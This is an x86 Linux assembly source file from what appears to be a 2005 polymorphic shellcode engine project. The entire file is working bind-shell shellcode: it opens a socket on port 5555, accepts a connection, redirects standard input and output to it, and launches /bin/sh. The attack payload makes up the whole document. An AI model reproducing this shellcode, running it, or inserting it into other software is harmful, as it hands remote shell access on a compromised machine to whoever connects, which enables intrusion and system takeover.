;
; bind.asm for Polymorphic Shellcode Engine project
; 
; Made by eee
; 
; Started on  Thu Apr 14 00:29:44 2005 eee
; Last update Sat Apr 16 15:20:43 2005 eee
;

BITS 32

;socket(family, type, proto)
	xor 	eax, eax
	cdq
	mov      al, 102
  	push 	edx		; 0=IP
  	inc  	edx
  	push 	edx		; 1=SOCK_STREAM
 	inc  	edx
  	push 	edx		; 2=AF_INET
  
  	mov  	ecx, esp
  	push 	byte 1
	pop	ebx		; 1 -> socket
  	int  	0x80



;bind(socket, addr, lenng)
bind: 
  	mov     edi, eax
        cdq
	push    edx
        push    word 0xB315	; port 0x15B3 = 5555
        inc     ebx		; 
        push    bx		; (0002 = AF_INET)
        mov     ecx, esp	; ecx = offset sockaddr struct
        push    byte 16		; len
        push    ecx		; push offset sockaddr struct
        push    eax		; handle socket
        mov 	ecx, esp
        mov 	al, 102
        int 	0x80
  


;listen(socket, backlog)
listen:
	mov	 al, 102
	mov	 bl, 4		; 4 -> listen
	int	0x80


;accept(socket, addr, len)
accept:
	push 	eax
	push 	edi
	mov 	ecx, esp
	inc  	ebx		; 5 -> accept
	mov	 al, 102
	int 	0x80

dup2:
        xor     ecx, ecx
        mov      cl, 3
	xchg	ebx, eax	; fd
boucle:
        dec     ecx
        mov     al, 63
        int     0x80
        test	ecx, ecx
	jne 	boucle
        

;execve /bin/sh
exec:
	xor	eax,eax
	mov     al, 11            ;execve
  	push	ecx
	push 	"//sh"
 	push 	"/bin"
 	mov  	ebx, esp
  	push 	ecx
  	push 	ebx
  	mov  	ecx, esp
  	int  	0x80

